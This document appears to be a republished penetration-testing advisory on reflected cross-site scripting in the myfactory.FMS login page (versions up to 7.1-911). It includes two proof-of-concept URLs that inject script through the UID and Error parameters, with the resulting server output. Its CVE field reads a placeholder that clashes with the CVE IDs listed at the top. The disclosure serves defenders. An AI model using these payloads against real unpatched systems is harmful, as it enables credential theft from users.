@@ -1,0 +1,135 @@
+id: 36905
+date: 10/13/2021
+title: myfactory.FMS 7.1-911 Cross Site Scripting Vulnerability
+author: RedTeam
+cves: CVE-2021-42566, CVE-2021-42565
+
+Cross-Site Scripting in myfactory.FMS
+
+
+During a penetration test, a reflected cross-site scripting
+vulnerability (XSS) was found in the myfactory.FMS login form. If a user
+opens an attacker-prepared link to the application, attackers can run
+arbitrary JavaScript code in the user's browser.
+
+
+Details
+=======
+
+Product: myfactory.FMS
+Affected Versions: <= 7.1-911
+Fixed Versions: 7.1-912 and later
+Vulnerability Type: Cross-Site Scripting
+Security Risk: medium
+Vendor URL: https://www.myfactory.com/myfactoryfms.aspx
+Vendor Status: fixed version released
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2021-001
+Advisory Status: published
+CVE: GENERIC-MAP-NOMATCH
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=GENERIC-MAP-NOMATCH
+
+
+Introduction
+============
+
+"With myfactory, you get a modern accounting application for your business. It
+covers every functionality necessary for an accounting system."
+(translated from German from the vendor's homepage)
+
+
+More Details
+============
+
+The myfactory.FMS web application[0] allows users to login with a username and
+password. If the password is wrong, the application redirects to a URL similar
+to the following:
+
+http://www.example.com/ie50/system/login/SysLoginUser.aspx?Login=Denied&UID=RedTeam
+
+The application then opens a dialogue telling the user that their
+username or password are wrong and uses the value of the parameter UID
+to prefill the login form resulting in the following source code:
+
+------------------------------------------------------------------------
+<td>
+<input NAME="txtUID" VALUE="RedTeam"
+   onkeypress="OnKeyPress(event)" placeholder="Benutzername" >
+</td>
+------------------------------------------------------------------------
+
+The UID parameter gets reflected without applying any encoding to it.
+
+A similar problem arises when the login leads to an error. This
+introduces a new parameter named 'Error':
+
+http://www.example.com/ie50/system/login/SysLoginUser.aspx?Login=Error&Error=RedTeam_Error
+
+The value of the Error parameter gets appended without encoding in the
+javascript function mOnLoad resulting in the following code:
+
+------------------------------------------------------------------------
+function mOnLoad(
+{
+  var sParams;
+  alert('Das System konnte Sie nicht anmelden.\n RedTeam_Error');
+[...]
+------------------------------------------------------------------------
+
+
+Proof of Concept
+================
+
+The XSS in the UID parameter can be triggered with the following URL:
+
+http://www.example.com/ie50/system/login/SysLoginUser.aspx?Login=Denied&UID="><script>alert("RedTeam+Pentesting")</script><span+"
+
+This will lead to the following HTML returned by the server:
+
+------------------------------------------------------------------------
+<td>
+<input NAME="txtUID" VALUE=""><script>alert("RedTeam Pentesting")</script><span ""
+   onkeypress="OnKeyPress(event)" placeholder="Benutzername" >
+</td>
+------------------------------------------------------------------------
+
+To demonstrate the XSS via the Error parameter, the following URL can be
+used:
+
+http://www.example.com/ie50/system/login/SysLoginUser.aspx?Login=Error&Error=');alert("RedTeam+Pentesting");//
+
+This will lead to the following JavaScript embedded in the HTML website
+returned by the server:
+
+------------------------------------------------------------------------
+function mOnLoad(
+{
+  var sParams;
+  alert('Das System konnte Sie nicht anmelden.\n ');alert("RedTeam+Pentesting");//');
+[...]
+------------------------------------------------------------------------
+
+Workaround
+==========
+
+None
+
+
+Fix
+===
+
+Install Version 7.1-912 or later.
+
+
+Security Risk
+=============
+
+This security vulnerability allows to execute arbitrary JavaScript code in
+users' browsers if they access URLs prepared by attackers. This provides many
+different possibilities for further attacks against these users. The
+vulnerability could for example be exploited to display a fake login to obtain
+credentials and consequently access a company's accounting information. Since
+attackers might be able to get access to sensitive financial data, but users
+have to actively open an attacker-defined link, this vulnerability is estimated
+to pose a medium risk.
+
+#  0day.today [2023-03-26]  #
